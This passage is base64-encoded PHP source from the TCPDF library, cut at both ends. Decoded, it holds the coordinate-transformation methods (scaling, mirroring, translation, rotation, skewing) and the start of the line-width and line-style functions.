JlaGF2aW9yLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDIuMS4wMDAgKDIwMDgtMDEtMDcpCgkgKiBAc2VlIFN0YXJ0VHJhbnNmb3JtKCksIFN0b3BUcmFuc2Zvcm0oKQoJICovCglwdWJsaWMgZnVuY3Rpb24gU3RvcFRyYW5zZm9ybSgpIHsKCQlpZiAoJHRoaXMtPnN0YXRlICE9IDIpIHsKCQkJcmV0dXJuOwoJCX0KCQkkdGhpcy0+X291dFJlc3RvcmVHcmFwaGljc1N0YXRlKCk7CgkJaWYgKGlzc2V0KCR0aGlzLT50cmFuc2ZtYXRyaXhbJHRoaXMtPnRyYW5zZm1hdHJpeF9rZXldKSkgewoJCQlhcnJheV9wb3AoJHRoaXMtPnRyYW5zZm1hdHJpeFskdGhpcy0+dHJhbnNmbWF0cml4X2tleV0pOwoJCQktLSR0aGlzLT50cmFuc2ZtYXRyaXhfa2V5OwoJCX0KCQlpZiAoJHRoaXMtPmlueG9iaikgewoJCQkvLyB3ZSBhcmUgaW5zaWRlIGFuIFhPYmplY3QgdGVtcGxhdGUKCQkJYXJyYXlfcG9wKCR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsndHJhbnNmbXJrJ10pOwoJCX0gZWxzZSB7CgkJCWFycmF5X3BvcCgkdGhpcy0+dHJhbnNmbXJrWyR0aGlzLT5wYWdlXSk7CgkJfQoJfQoJLyoqCgkgKiBIb3Jpem9udGFsIFNjYWxpbmcuCgkgKiBAcGFyYW0gZmxvYXQgJHNfeCBzY2FsaW5nIGZhY3RvciBmb3Igd2lkdGggYXMgcGVyY2VudC4gMCBpcyBub3QgYWxsb3dlZC4KCSAqIEBwYXJhbSBpbnQgJHggYWJzY2lzc2Egb2YgdGhlIHNjYWxpbmcgY2VudGVyLiBEZWZhdWx0IGlzIGN1cnJlbnQgeCBwb3NpdGlvbgoJICogQHBhcmFtIGludCAkeSBvcmRpbmF0ZSBvZiB0aGUgc2NhbGluZyBjZW50ZXIuIERlZmF1bHQgaXMgY3VycmVudCB5IHBvc2l0aW9uCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMi4xLjAwMCAoMjAwOC0wMS0wNykKCSAqIEBzZWUgU3RhcnRUcmFuc2Zvcm0oKSwgU3RvcFRyYW5zZm9ybSgpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBTY2FsZVgoJHNfeCwgJHg9JycsICR5PScnKSB7CgkJJHRoaXMtPlNjYWxlKCRzX3gsIDEwMCwgJHgsICR5KTsKCX0KCgkvKioKCSAqIFZlcnRpY2FsIFNjYWxpbmcuCgkgKiBAcGFyYW0gZmxvYXQgJHNfeSBzY2FsaW5nIGZhY3RvciBmb3IgaGVpZ2h0IGFzIHBlcmNlbnQuIDAgaXMgbm90IGFsbG93ZWQuCgkgKiBAcGFyYW0gaW50ICR4IGFic2Npc3NhIG9mIHRoZSBzY2FsaW5nIGNlbnRlci4gRGVmYXVsdCBpcyBjdXJyZW50IHggcG9zaXRpb24KCSAqIEBwYXJhbSBpbnQgJHkgb3JkaW5hdGUgb2YgdGhlIHNjYWxpbmcgY2VudGVyLiBEZWZhdWx0IGlzIGN1cnJlbnQgeSBwb3NpdGlvbgoJICogQHB1YmxpYwoJICogQHNpbmNlIDIuMS4wMDAgKDIwMDgtMDEtMDcpCgkgKiBAc2VlIFN0YXJ0VHJhbnNmb3JtKCksIFN0b3BUcmFuc2Zvcm0oKQoJICovCglwdWJsaWMgZnVuY3Rpb24gU2NhbGVZKCRzX3ksICR4PScnLCAkeT0nJykgewoJCSR0aGlzLT5TY2FsZSgxMDAsICRzX3ksICR4LCAkeSk7Cgl9CgoJLyoqCgkgKiBWZXJ0aWNhbCBhbmQgaG9yaXpvbnRhbCBwcm9wb3J0aW9uYWwgU2NhbGluZy4KCSAqIEBwYXJhbSBmbG9hdCAkcyBzY2FsaW5nIGZhY3RvciBmb3Igd2lkdGggYW5kIGhlaWdodCBhcyBwZXJjZW50LiAwIGlzIG5vdCBhbGxvd2VkLgoJICogQHBhcmFtIGludCAkeCBhYnNjaXNzYSBvZiB0aGUgc2NhbGluZyBjZW50ZXIuIERlZmF1bHQgaXMgY3VycmVudCB4IHBvc2l0aW9uCgkgKiBAcGFyYW0gaW50ICR5IG9yZGluYXRlIG9mIHRoZSBzY2FsaW5nIGNlbnRlci4gRGVmYXVsdCBpcyBjdXJyZW50IHkgcG9zaXRpb24KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAyLjEuMDAwICgyMDA4LTAxLTA3KQoJICogQHNlZSBTdGFydFRyYW5zZm9ybSgpLCBTdG9wVHJhbnNmb3JtKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIFNjYWxlWFkoJHMsICR4PScnLCAkeT0nJykgewoJCSR0aGlzLT5TY2FsZSgkcywgJHMsICR4LCAkeSk7Cgl9CgoJLyoqCgkgKiBWZXJ0aWNhbCBhbmQgaG9yaXpvbnRhbCBub24tcHJvcG9ydGlvbmFsIFNjYWxpbmcuCgkgKiBAcGFyYW0gZmxvYXQgJHNfeCBzY2FsaW5nIGZhY3RvciBmb3Igd2lkdGggYXMgcGVyY2VudC4gMCBpcyBub3QgYWxsb3dlZC4KCSAqIEBwYXJhbSBmbG9hdCAkc195IHNjYWxpbmcgZmFjdG9yIGZvciBoZWlnaHQgYXMgcGVyY2VudC4gMCBpcyBub3QgYWxsb3dlZC4KCSAqIEBwYXJhbSBmbG9hdHxudWxsICR4IGFic2Npc3NhIG9mIHRoZSBzY2FsaW5nIGNlbnRlci4gRGVmYXVsdCBpcyBjdXJyZW50IHggcG9zaXRpb24KCSAqIEBwYXJhbSBmbG9hdHxudWxsICR5IG9yZGluYXRlIG9mIHRoZSBzY2FsaW5nIGNlbnRlci4gRGVmYXVsdCBpcyBjdXJyZW50IHkgcG9zaXRpb24KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAyLjEuMDAwICgyMDA4LTAxLTA3KQoJICogQHNlZSBTdGFydFRyYW5zZm9ybSgpLCBTdG9wVHJhbnNmb3JtKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIFNjYWxlKCRzX3gsICRzX3ksICR4PW51bGwsICR5PW51bGwpIHsKCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHgpKSB7CgkJCSR4ID0gJHRoaXMtPng7CgkJfQoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkeSkpIHsKCQkJJHkgPSAkdGhpcy0+eTsKCQl9CgkJaWYgKCgkc194ID09IDApIE9SICgkc195ID09IDApKSB7CgkJCSR0aGlzLT5FcnJvcignUGxlYXNlIGRvIG5vdCB1c2UgdmFsdWVzIGVxdWFsIHRvIHplcm8gZm9yIHNjYWxpbmcnKTsKCQl9CgkJJHkgPSAoJHRoaXMtPmggLSAkeSkgKiAkdGhpcy0+azsKCQkkeCAqPSAkdGhpcy0+azsKCQkvL2NhbGN1bGF0ZSBlbGVtZW50cyBvZiB0cmFuc2Zvcm1hdGlvbiBtYXRyaXgKCQkkc194IC89IDEwMDsKCQkkc195IC89IDEwMDsKCQkkdG0gPSBhcnJheSgpOwoJCSR0bVswXSA9ICRzX3g7CgkJJHRtWzFdID0gMDsKCQkkdG1bMl0gPSAwOwoJCSR0bVszXSA9ICRzX3k7CgkJJHRtWzRdID0gJHggKiAoMSAtICRzX3gpOwoJCSR0bVs1XSA9ICR5ICogKDEgLSAkc195KTsKCQkvL3NjYWxlIHRoZSBjb29yZGluYXRlIHN5c3RlbQoJCSR0aGlzLT5UcmFuc2Zvcm0oJHRtKTsKCX0KCgkvKioKCSAqIEhvcml6b250YWwgTWlycm9yaW5nLgoJICogQHBhcmFtIGZsb2F0fG51bGwgJHggYWJzY2lzc2Egb2YgdGhlIHBvaW50LiBEZWZhdWx0IGlzIGN1cnJlbnQgeCBwb3NpdGlvbgoJICogQHB1YmxpYwoJICogQHNpbmNlIDIuMS4wMDAgKDIwMDgtMDEtMDcpCgkgKiBAc2VlIFN0YXJ0VHJhbnNmb3JtKCksIFN0b3BUcmFuc2Zvcm0oKQoJICovCglwdWJsaWMgZnVuY3Rpb24gTWlycm9ySCgkeD1udWxsKSB7CgkJJHRoaXMtPlNjYWxlKC0xMDAsIDEwMCwgJHgpOwoJfQoKCS8qKgoJICogVmVyaWNhbCBNaXJyb3JpbmcuCgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkeSBvcmRpbmF0ZSBvZiB0aGUgcG9pbnQuIERlZmF1bHQgaXMgY3VycmVudCB5IHBvc2l0aW9uCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMi4xLjAwMCAoMjAwOC0wMS0wNykKCSAqIEBzZWUgU3RhcnRUcmFuc2Zvcm0oKSwgU3RvcFRyYW5zZm9ybSgpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBNaXJyb3JWKCR5PW51bGwpIHsKCQkkdGhpcy0+U2NhbGUoMTAwLCAtMTAwLCBudWxsLCAkeSk7Cgl9CgoJLyoqCgkgKiBQb2ludCByZWZsZWN0aW9uIG1pcnJvcmluZy4KCSAqIEBwYXJhbSBmbG9hdHxudWxsICR4IGFic2Npc3NhIG9mIHRoZSBwb2ludC4gRGVmYXVsdCBpcyBjdXJyZW50IHggcG9zaXRpb24KCSAqIEBwYXJhbSBmbG9hdHxudWxsICR5IG9yZGluYXRlIG9mIHRoZSBwb2ludC4gRGVmYXVsdCBpcyBjdXJyZW50IHkgcG9zaXRpb24KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAyLjEuMDAwICgyMDA4LTAxLTA3KQoJICogQHNlZSBTdGFydFRyYW5zZm9ybSgpLCBTdG9wVHJhbnNmb3JtKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIE1pcnJvclAoJHg9bnVsbCwkeT1udWxsKSB7CgkJJHRoaXMtPlNjYWxlKC0xMDAsIC0xMDAsICR4LCAkeSk7Cgl9CgoJLyoqCgkgKiBSZWZsZWN0aW9uIGFnYWluc3QgYSBzdHJhaWdodCBsaW5lIHRocm91Z2ggcG9pbnQgKHgsIHkpIHdpdGggdGhlIGdyYWRpZW50IGFuZ2xlIChhbmdsZSkuCgkgKiBAcGFyYW0gZmxvYXQgJGFuZ2xlIGdyYWRpZW50IGFuZ2xlIG9mIHRoZSBzdHJhaWdodCBsaW5lLiBEZWZhdWx0IGlzIDAgKGhvcml6b250YWwgbGluZSkuCgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkeCBhYnNjaXNzYSBvZiB0aGUgcG9pbnQuIERlZmF1bHQgaXMgY3VycmVudCB4IHBvc2l0aW9uCgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkeSBvcmRpbmF0ZSBvZiB0aGUgcG9pbnQuIERlZmF1bHQgaXMgY3VycmVudCB5IHBvc2l0aW9uCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMi4xLjAwMCAoMjAwOC0wMS0wNykKCSAqIEBzZWUgU3RhcnRUcmFuc2Zvcm0oKSwgU3RvcFRyYW5zZm9ybSgpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBNaXJyb3JMKCRhbmdsZT0wLCAkeD1udWxsLCR5PW51bGwpIHsKCQkkdGhpcy0+U2NhbGUoLTEwMCwgMTAwLCAkeCwgJHkpOwoJCSR0aGlzLT5Sb3RhdGUoLTIqKCRhbmdsZS05MCksICR4LCAkeSk7Cgl9CgoJLyoqCgkgKiBUcmFuc2xhdGUgZ3JhcGhpYyBvYmplY3QgaG9yaXpvbnRhbGx5LgoJICogQHBhcmFtIGludCAkdF94IG1vdmVtZW50IHRvIHRoZSByaWdodCAob3IgbGVmdCBmb3IgUlRMKQoJICogQHB1YmxpYwoJICogQHNpbmNlIDIuMS4wMDAgKDIwMDgtMDEtMDcpCgkgKiBAc2VlIFN0YXJ0VHJhbnNmb3JtKCksIFN0b3BUcmFuc2Zvcm0oKQoJICovCglwdWJsaWMgZnVuY3Rpb24gVHJhbnNsYXRlWCgkdF94KSB7CgkJJHRoaXMtPlRyYW5zbGF0ZSgkdF94LCAwKTsKCX0KCgkvKioKCSAqIFRyYW5zbGF0ZSBncmFwaGljIG9iamVjdCB2ZXJ0aWNhbGx5LgoJICogQHBhcmFtIGludCAkdF95IG1vdmVtZW50IHRvIHRoZSBib3R0b20KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAyLjEuMDAwICgyMDA4LTAxLTA3KQoJICogQHNlZSBTdGFydFRyYW5zZm9ybSgpLCBTdG9wVHJhbnNmb3JtKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIFRyYW5zbGF0ZVkoJHRfeSkgewoJCSR0aGlzLT5UcmFuc2xhdGUoMCwgJHRfeSk7Cgl9CgoJLyoqCgkgKiBUcmFuc2xhdGUgZ3JhcGhpYyBvYmplY3QgaG9yaXpvbnRhbGx5IGFuZCB2ZXJ0aWNhbGx5LgoJICogQHBhcmFtIGludCAkdF94IG1vdmVtZW50IHRvIHRoZSByaWdodAoJICogQHBhcmFtIGludCAkdF95IG1vdmVtZW50IHRvIHRoZSBib3R0b20KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAyLjEuMDAwICgyMDA4LTAxLTA3KQoJICogQHNlZSBTdGFydFRyYW5zZm9ybSgpLCBTdG9wVHJhbnNmb3JtKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIFRyYW5zbGF0ZSgkdF94LCAkdF95KSB7CgkJLy9jYWxjdWxhdGUgZWxlbWVudHMgb2YgdHJhbnNmb3JtYXRpb24gbWF0cml4CgkJJHRtID0gYXJyYXkoKTsKCQkkdG1bMF0gPSAxOwoJCSR0bVsxXSA9IDA7CgkJJHRtWzJdID0gMDsKCQkkdG1bM10gPSAxOwoJCSR0bVs0XSA9ICR0X3ggKiAkdGhpcy0+azsKCQkkdG1bNV0gPSAtJHRfeSAqICR0aGlzLT5rOwoJCS8vdHJhbnNsYXRlIHRoZSBjb29yZGluYXRlIHN5c3RlbQoJCSR0aGlzLT5UcmFuc2Zvcm0oJHRtKTsKCX0KCgkvKioKCSAqIFJvdGF0ZSBvYmplY3QuCgkgKiBAcGFyYW0gZmxvYXQgJGFuZ2xlIGFuZ2xlIGluIGRlZ3JlZXMgZm9yIGNvdW50ZXItY2xvY2t3aXNlIHJvdGF0aW9uCgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkeCBhYnNjaXNzYSBvZiB0aGUgcm90YXRpb24gY2VudGVyLiBEZWZhdWx0IGlzIGN1cnJlbnQgeCBwb3NpdGlvbgoJICogQHBhcmFtIGZsb2F0fG51bGwgJHkgb3JkaW5hdGUgb2YgdGhlIHJvdGF0aW9uIGNlbnRlci4gRGVmYXVsdCBpcyBjdXJyZW50IHkgcG9zaXRpb24KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAyLjEuMDAwICgyMDA4LTAxLTA3KQoJICogQHNlZSBTdGFydFRyYW5zZm9ybSgpLCBTdG9wVHJhbnNmb3JtKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIFJvdGF0ZSgkYW5nbGUsICR4PW51bGwsICR5PW51bGwpIHsKCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHgpKSB7CgkJCSR4ID0gJHRoaXMtPng7CgkJfQoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkeSkpIHsKCQkJJHkgPSAkdGhpcy0+eTsKCQl9CgkJJHkgPSAoJHRoaXMtPmggLSAkeSkgKiAkdGhpcy0+azsKCQkkeCAqPSAkdGhpcy0+azsKCQkvL2NhbGN1bGF0ZSBlbGVtZW50cyBvZiB0cmFuc2Zvcm1hdGlvbiBtYXRyaXgKCQkkdG0gPSBhcnJheSgpOwoJCSR0bVswXSA9IGNvcyhkZWcycmFkKCRhbmdsZSkpOwoJCSR0bVsxXSA9IHNpbihkZWcycmFkKCRhbmdsZSkpOwoJCSR0bVsyXSA9IC0kdG1bMV07CgkJJHRtWzNdID0gJHRtWzBdOwoJCSR0bVs0XSA9ICR4ICsgKCR0bVsxXSAqICR5KSAtICgkdG1bMF0gKiAkeCk7CgkJJHRtWzVdID0gJHkgLSAoJHRtWzBdICogJHkpIC0gKCR0bVsxXSAqICR4KTsKCQkvL3JvdGF0ZSB0aGUgY29vcmRpbmF0ZSBzeXN0ZW0gYXJvdW5kICgkeCwkeSkKCQkkdGhpcy0+VHJhbnNmb3JtKCR0bSk7Cgl9CgoJLyoqCgkgKiBTa2V3IGhvcml6b250YWxseS4KCSAqIEBwYXJhbSBmbG9hdCAkYW5nbGVfeCBhbmdsZSBpbiBkZWdyZWVzIGJldHdlZW4gLTkwIChza2V3IHRvIHRoZSBsZWZ0KSBhbmQgOTAgKHNrZXcgdG8gdGhlIHJpZ2h0KQoJICogQHBhcmFtIGZsb2F0fG51bGwgJHggYWJzY2lzc2Egb2YgdGhlIHNrZXdpbmcgY2VudGVyLiBkZWZhdWx0IGlzIGN1cnJlbnQgeCBwb3NpdGlvbgoJICogQHBhcmFtIGZsb2F0fG51bGwgJHkgb3JkaW5hdGUgb2YgdGhlIHNrZXdpbmcgY2VudGVyLiBkZWZhdWx0IGlzIGN1cnJlbnQgeSBwb3NpdGlvbgoJICogQHB1YmxpYwoJICogQHNpbmNlIDIuMS4wMDAgKDIwMDgtMDEtMDcpCgkgKiBAc2VlIFN0YXJ0VHJhbnNmb3JtKCksIFN0b3BUcmFuc2Zvcm0oKQoJICovCglwdWJsaWMgZnVuY3Rpb24gU2tld1goJGFuZ2xlX3gsICR4PW51bGwsICR5PW51bGwpIHsKCQkkdGhpcy0+U2tldygkYW5nbGVfeCwgMCwgJHgsICR5KTsKCX0KCgkvKioKCSAqIFNrZXcgdmVydGljYWxseS4KCSAqIEBwYXJhbSBmbG9hdCAkYW5nbGVfeSBhbmdsZSBpbiBkZWdyZWVzIGJldHdlZW4gLTkwIChza2V3IHRvIHRoZSBib3R0b20pIGFuZCA5MCAoc2tldyB0byB0aGUgdG9wKQoJICogQHBhcmFtIGZsb2F0fG51bGwgJHggYWJzY2lzc2Egb2YgdGhlIHNrZXdpbmcgY2VudGVyLiBkZWZhdWx0IGlzIGN1cnJlbnQgeCBwb3NpdGlvbgoJICogQHBhcmFtIGZsb2F0fG51bGwgJHkgb3JkaW5hdGUgb2YgdGhlIHNrZXdpbmcgY2VudGVyLiBkZWZhdWx0IGlzIGN1cnJlbnQgeSBwb3NpdGlvbgoJICogQHB1YmxpYwoJICogQHNpbmNlIDIuMS4wMDAgKDIwMDgtMDEtMDcpCgkgKiBAc2VlIFN0YXJ0VHJhbnNmb3JtKCksIFN0b3BUcmFuc2Zvcm0oKQoJICovCglwdWJsaWMgZnVuY3Rpb24gU2tld1koJGFuZ2xlX3ksICR4PW51bGwsICR5PW51bGwpIHsKCQkkdGhpcy0+U2tldygwLCAkYW5nbGVfeSwgJHgsICR5KTsKCX0KCgkvKioKCSAqIFNrZXcuCgkgKiBAcGFyYW0gZmxvYXQgJGFuZ2xlX3ggYW5nbGUgaW4gZGVncmVlcyBiZXR3ZWVuIC05MCAoc2tldyB0byB0aGUgbGVmdCkgYW5kIDkwIChza2V3IHRvIHRoZSByaWdodCkKCSAqIEBwYXJhbSBmbG9hdCAkYW5nbGVfeSBhbmdsZSBpbiBkZWdyZWVzIGJldHdlZW4gLTkwIChza2V3IHRvIHRoZSBib3R0b20pIGFuZCA5MCAoc2tldyB0byB0aGUgdG9wKQoJICogQHBhcmFtIGZsb2F0fG51bGwgJHggYWJzY2lzc2Egb2YgdGhlIHNrZXdpbmcgY2VudGVyLiBkZWZhdWx0IGlzIGN1cnJlbnQgeCBwb3NpdGlvbgoJICogQHBhcmFtIGZsb2F0fG51bGwgJHkgb3JkaW5hdGUgb2YgdGhlIHNrZXdpbmcgY2VudGVyLiBkZWZhdWx0IGlzIGN1cnJlbnQgeSBwb3NpdGlvbgoJICogQHB1YmxpYwoJICogQHNpbmNlIDIuMS4wMDAgKDIwMDgtMDEtMDcpCgkgKiBAc2VlIFN0YXJ0VHJhbnNmb3JtKCksIFN0b3BUcmFuc2Zvcm0oKQoJICovCglwdWJsaWMgZnVuY3Rpb24gU2tldygkYW5nbGVfeCwgJGFuZ2xlX3ksICR4PW51bGwsICR5PW51bGwpIHsKCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHgpKSB7CgkJCSR4ID0gJHRoaXMtPng7CgkJfQoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkeSkpIHsKCQkJJHkgPSAkdGhpcy0+eTsKCQl9CgkJaWYgKCgkYW5nbGVfeCA8PSAtOTApIE9SICgkYW5nbGVfeCA+PSA5MCkgT1IgKCRhbmdsZV95IDw9IC05MCkgT1IgKCRhbmdsZV95ID49IDkwKSkgewoJCQkkdGhpcy0+RXJyb3IoJ1BsZWFzZSB1c2UgdmFsdWVzIGJldHdlZW4gLTkwIGFuZCArOTAgZGVncmVlcyBmb3IgU2tld2luZy4nKTsKCQl9CgkJJHggKj0gJHRoaXMtPms7CgkJJHkgPSAoJHRoaXMtPmggLSAkeSkgKiAkdGhpcy0+azsKCQkvL2NhbGN1bGF0ZSBlbGVtZW50cyBvZiB0cmFuc2Zvcm1hdGlvbiBtYXRyaXgKCQkkdG0gPSBhcnJheSgpOwoJCSR0bVswXSA9IDE7CgkJJHRtWzFdID0gdGFuKGRlZzJyYWQoJGFuZ2xlX3kpKTsKCQkkdG1bMl0gPSB0YW4oZGVnMnJhZCgkYW5nbGVfeCkpOwoJCSR0bVszXSA9IDE7CgkJJHRtWzRdID0gLSR0bVsyXSAqICR5OwoJCSR0bVs1XSA9IC0kdG1bMV0gKiAkeDsKCQkvL3NrZXcgdGhlIGNvb3JkaW5hdGUgc3lzdGVtCgkJJHRoaXMtPlRyYW5zZm9ybSgkdG0pOwoJfQoKCS8qKgoJICogQXBwbHkgZ3JhcGhpYyB0cmFuc2Zvcm1hdGlvbnMuCgkgKiBAcGFyYW0gYXJyYXkgJHRtIHRyYW5zZm9ybWF0aW9uIG1hdHJpeAoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDIuMS4wMDAgKDIwMDgtMDEtMDcpCgkgKiBAc2VlIFN0YXJ0VHJhbnNmb3JtKCksIFN0b3BUcmFuc2Zvcm0oKQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gVHJhbnNmb3JtKCR0bSkgewoJCWlmICgkdGhpcy0+c3RhdGUgIT0gMikgewoJCQlyZXR1cm47CgkJfQoJCSR0aGlzLT5fb3V0KHNwcmludGYoJyVGICVGICVGICVGICVGICVGIGNtJywgJHRtWzBdLCAkdG1bMV0sICR0bVsyXSwgJHRtWzNdLCAkdG1bNF0sICR0bVs1XSkpOwoJCS8vIGFkZCB0cmFuZm9ybWF0aW9uIG1hdHJpeAoJCSR0aGlzLT50cmFuc2ZtYXRyaXhbJHRoaXMtPnRyYW5zZm1hdHJpeF9rZXldW10gPSBhcnJheSgnYScgPT4gJHRtWzBdLCAnYicgPT4gJHRtWzFdLCAnYycgPT4gJHRtWzJdLCAnZCcgPT4gJHRtWzNdLCAnZScgPT4gJHRtWzRdLCAnZicgPT4gJHRtWzVdKTsKCQkvLyB1cGRhdGUgdHJhbnNmb3JtYXRpb24gbWFyawoJCWlmICgkdGhpcy0+aW54b2JqKSB7CgkJCS8vIHdlIGFyZSBpbnNpZGUgYW4gWE9iamVjdCB0ZW1wbGF0ZQoJCQlpZiAoZW5kKCR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsndHJhbnNmbXJrJ10pICE9PSBmYWxzZSkgewoJCQkJJGtleSA9IGtleSgkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ3RyYW5zZm1yayddKTsKCQkJCSR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsndHJhbnNmbXJrJ11bJGtleV0gPSBzdHJsZW4oJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydvdXRkYXRhJ10pOwoJCQl9CgkJfSBlbHNlaWYgKGVuZCgkdGhpcy0+dHJhbnNmbXJrWyR0aGlzLT5wYWdlXSkgIT09IGZhbHNlKSB7CgkJCSRrZXkgPSBrZXkoJHRoaXMtPnRyYW5zZm1ya1skdGhpcy0+cGFnZV0pOwoJCQkkdGhpcy0+dHJhbnNmbXJrWyR0aGlzLT5wYWdlXVska2V5XSA9ICR0aGlzLT5wYWdlbGVuWyR0aGlzLT5wYWdlXTsKCQl9Cgl9CgoJLy8gRU5EIFRSQU5TRk9STUFUSU9OUyBTRUNUSU9OIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCgkvLyBTVEFSVCBHUkFQSElDIEZVTkNUSU9OUyBTRUNUSU9OIC0tLS0tLS0tLS0tLS0tLS0tLS0tLQoJLy8gVGhlIGZvbGxvd2luZyBzZWN0aW9uIGlzIGJhc2VkIG9uIHRoZSBjb2RlIHByb3ZpZGVkIGJ5IERhdmlkIEhlcm5hbmRleiBTYW56CgoJLyoqCgkgKiBEZWZpbmVzIHRoZSBsaW5lIHdpZHRoLiBCeSBkZWZhdWx0LCB0aGUgdmFsdWUgZXF1YWxzIDAuMiBtbS4gVGhlIG1ldGhvZCBjYW4gYmUgY2FsbGVkIGJlZm9yZSB0aGUgZmlyc3QgcGFnZSBpcyBjcmVhdGVkIGFuZCB0aGUgdmFsdWUgaXMgcmV0YWluZWQgZnJvbSBwYWdlIHRvIHBhZ2UuCgkgKiBAcGFyYW0gZmxvYXQgJHdpZHRoIFRoZSB3aWR0aC4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjAKCSAqIEBzZWUgTGluZSgpLCBSZWN0KCksIENlbGwoKSwgTXVsdGlDZWxsKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldExpbmVXaWR0aCgkd2lkdGgpIHsKCQkvL1NldCBsaW5lIHdpZHRoCgkJJHRoaXMtPkxpbmVXaWR0aCA9ICR3aWR0aDsKCQkkdGhpcy0+bGluZXN0eWxlV2lkdGggPSBzcHJpbnRmKCclRiB3JywgKCR3aWR0aCAqICR0aGlzLT5rKSk7CgkJaWYgKCR0aGlzLT5zdGF0ZSA9PSAyKSB7CgkJCSR0aGlzLT5fb3V0KCR0aGlzLT5saW5lc3R5bGVXaWR0aCk7CgkJfQoJfQoKCS8qKgoJICogUmV0dXJucyB0aGUgY3VycmVudCB0aGUgbGluZSB3aWR0aC4KCSAqIEByZXR1cm4gaW50IExpbmUgd2lkdGgKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAyLjEuMDAwICgyMDA4LTAxLTA3KQoJICogQHNlZSBMaW5lKCksIFNldExpbmVXaWR0aCgpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBHZXRMaW5lV2lkdGgoKSB7CgkJcmV0dXJuICR0aGlzLT5MaW5lV2lkdGg7Cgl9CgoJLyoqCgkgKiBTZXQgbGluZSBzdHlsZS4KCSAqIEBwYXJhbSBhcnJheSAkc3R5bGUgTGluZSBzdHlsZS4gQXJyYXkgd2l0aCBrZXlzIGFtb25nIHRoZSBmb2xsb3dpbmc6CgkgKiA8dWw+CgkgKgkgPGxpPndpZHRoIChmbG9hdCk6IFdpZHRoIG9mIHRoZSBsaW5lIGluIHVzZXIgdW5pdHMuPC9saT4KCSAqCSA8bGk+Y2FwIChzdHJpbmcpOiBUeXBlIG9mIGNhcCB0byBwdXQgb24gdGhlIGxpbmUuIFBvc3NpYmxlIHZhbHVlcyBhcmU6CgkgKiBidXR0LCByb3VuZCwgc3F1YXJlLiBUaGUgZGlmZmVyZW5jZSBiZXR3ZWVuICJzcXVhcmUiIGFuZCAiYnV0dCIgaXMgdGhhdAoJICogInNxdWFyZSIgcHJvamVjdHMgYSBmbGF0IGVuZCBwYXN0IHRoZSBlbmQgb2YgdGhlIGxpbmUuPC9saT4KCSAqCSA8bGk+am9pbiAoc3RyaW5nKTogVHlwZSBvZiBqb2luLiBQb3NzaWJsZSB2YWx1ZXMgYXJlOiBtaXRlciwgcm91bmQsCgkgKiBiZXZlbC48L2xpPgoJICoJIDxsaT5kYXNoIChtaXhlZCk6IERhc2ggcGF0dGVybi4gSXMgMCAod2l0aG91dCBkYXNoKSBvciBzdHJpbmcgd2l0aAoJICogc2VyaWVzIG9mIGxlbmd0aCB2YWx1ZXMsIHdoaWNoIGFyZSB0aGUgbGVuZ3RocyBvZiB0aGUgb24gYW5kIG9mZiBkYXNoZXMuCgkgKiBGb3IgZXhhbXBsZTogIjIiIHJlcHJlc2VudHMgMiBvbiwgMiBvZmYsIDIgb24sIDIgb2ZmLCAuLi47ICIyLDEiIGlzIDIgb24sCgkgKiAxIG9mZiwgMiBvbiwgMSBvZmYsIC4uLjwvbGk+CgkgKgkgPGxpPnBoYXNlIChpbnRlZ2VyKTogTW9kaWZpZXIgb24gdGhlIGRhc2ggcGF0dGVybiB3aGljaCBpcyB1c2VkIHRvIHNoaWZ0CgkgKiB0aGUgcG9pbnQgYXQgd2hpY2ggdGhlIHBhdHRlcm4gc3RhcnRzLjwvbGk+CgkgKgkgPGxpPmNvbG9yIChhcnJheSk6IERyYXcgY29sb3IuIEZvcm1hdDogYXJyYXkoR1JFWSkgb3IgYXJyYXkoUixHLEIpIG9yIGFycmF5KEMsTSxZLEspIG9yIGFycmF5KEMsTSxZLEssU3BvdENvbG9yTmFtZSkuPC9saT4KCSAqIDwvdWw+CgkgKiBAcGFyYW0gYm9vbGVhbiAkcmV0IGlmIHRydWUgZG8gbm90IHNlbmQgdGhlIGNvbW1hbmQuCgkgKiBAcmV0dXJuIHN0cmluZyB0aGUgUERGIGNvbW1hbmQKCSAqIEBwdW